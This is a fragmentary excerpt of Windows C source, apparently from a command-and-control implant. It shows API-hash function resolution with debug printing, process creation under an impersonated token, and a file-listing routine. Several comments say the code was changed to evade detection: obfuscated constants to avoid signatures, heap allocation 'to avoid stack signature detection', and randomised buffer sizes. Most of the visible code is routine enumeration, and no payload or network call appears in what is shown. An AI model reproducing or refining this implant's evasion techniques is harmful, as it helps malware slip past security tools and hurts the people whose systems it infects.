...
ULONG HashEx(
    ...
    do {
        ...
        if ( Upper ) {
            // Obfuscated branchless uppercase conversion - avoids magic constants
    ...
    if (hash_count < 200) {
        ...
        // Detect Unicode and show readable content
        if (Length > 2 && ptr[1] == 0x00 && ptr[3] == 0x00) {
            // Unicode detected - extract readable characters
            CHAR unicode_str[64] = {0};
            ULONG j = 0;
            for (ULONG i = 0; i < Length && i < 62 && j < 63; i += 2) {
                if (ptr[i] != 0x00 && ptr[i] >= 0x20 && ptr[i] <= 0x7E) {
                    unicode_str[j++] = ptr[i];
                }
            }
            PRINTF("String=%s Length=%lu Hash=0x%08x\n", unicode_str, Length, Hash);
        } else {
            PRINTF("String=%s Length=%lu Hash=0x%08x\n", (PCHAR)String, Length, Hash);
        }
        hash_count++;
    }
#endif
...
#ifdef HASH_DEBUG
        ULONG computed_hash = HashEx( FunctionName, 0, TRUE );
        if ( Hash == H_FUNC_NTDUPLICATEOBJECT ) {
            PRINTF( "LdrFunctionAddr: Function[%d]=%s Hash=0x%08x Target=0x%08x\n", i, FunctionName, computed_hash, Hash );
        }
#endif
...
#ifdef HASH_DEBUG
            PRINTF( "HASH SUCCESS: Hash=0x%08x Function=%s Address=%p\n", Hash, FunctionName, FunctionAddr );
#endif
            return FunctionAddr;
        }
    }
...
#ifdef HASH_DEBUG
    PRINTF( "HASH RESOLUTION FAILURE: Hash=0x%08x Module=%p\n", Hash, Module );
#endif
...
BOOL ProcessCreate(
    ...
    if ( Instance->Tokens.Impersonate )
    {
        ...
        Path = (WCHAR*)MmHeapAlloc((MAX_PATH * 2 + GenerateRandomValue(16, 64)) * sizeof(WCHAR));

        if (Path) {
            MemSet(Path, 0, (MAX_PATH * 2) * sizeof(WCHAR));
    ...
    // Cleanup heap-allocated path buffer
    if ( Path ) {
        MmHeapFree( Path );
        Path = NULL;
    }
...
{
    // Allocate large structures on heap to avoid stack signature detection
    PWIN32_FIND_DATAW pFindData     = Instance->Win32.LocalAlloc( LPTR, sizeof(WIN32_FIND_DATAW) );
    HANDLE            hFile         = NULL;
    ...
    hFile = Instance->Win32.FindFirstFileW( Path, pFindData );
    ...
    IsDir = ( pFindData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) == FILE_ATTRIBUTE_DIRECTORY;
    ...
    do
    {
        ...
        // ignore .
        if ( IsDir &&
             StringLengthW( pFindData->cFileName ) == 1 &&
             pFindData->cFileName[0] == 0x2e )
            continue;

        // ignore ..
        if ( IsDir &&
             StringLengthW( pFindData->cFileName ) == 2 &&
             pFindData->cFileName[0] == 0x2e &&
             pFindData->cFileName[1] == 0x2e )
            continue;
        ...
        if ( IsDir && SubDirs )
        {
            ...
            StringConcatW( SubDir->Path, pFindData->cFileName );
        ...
        if ( Starts )
        {
            if ( StringLengthW( pFindData->cFileName ) < StringLengthW( Starts ) )
                continue;
            if ( StringCompareIW( Starts, pFindData->cFileName ) != 0 )
                continue;
        }
        ...
        if ( Contains )
        {
            if ( StringLengthW( pFindData->cFileName ) < StringLengthW( Contains ) )
                continue;
            if ( ! WcsStr( pFindData->cFileName, Contains ) )
                continue;
        }
        ...
        if ( Ends )
        {
            if ( StringLengthW( pFindData->cFileName ) < StringLengthW( Ends ) )
                continue;
            if ( StringCompareIW( Ends, &pFindData->cFileName[ StringLengthW( pFindData->cFileName ) - StringLengthW( Ends ) ] ) != 0 )
                continue;
        }
        ...
        Instance->Win32.FileTimeToSystemTime( &pFindData->ftLastAccessTime, &DirOrFile->FileTime );
        ...
        {
            FileSize.HighPart = pFindData->nFileSizeHigh;
            FileSize.LowPart  = pFindData->nFileSizeLow;
        ...
        MemCopy( DirOrFile->FileName, pFindData->cFileName, StringLengthW( pFindData->cFileName ) * sizeof( WCHAR ) );
    ...
    while ( Instance->Win32.FindNextFileW( hFile, pFindData ) );
...
Cleanup:
    ...
    DATA_FREE( pFindData, sizeof( WIN32_FIND_DATAW ) );  // Free heap-allocated structure
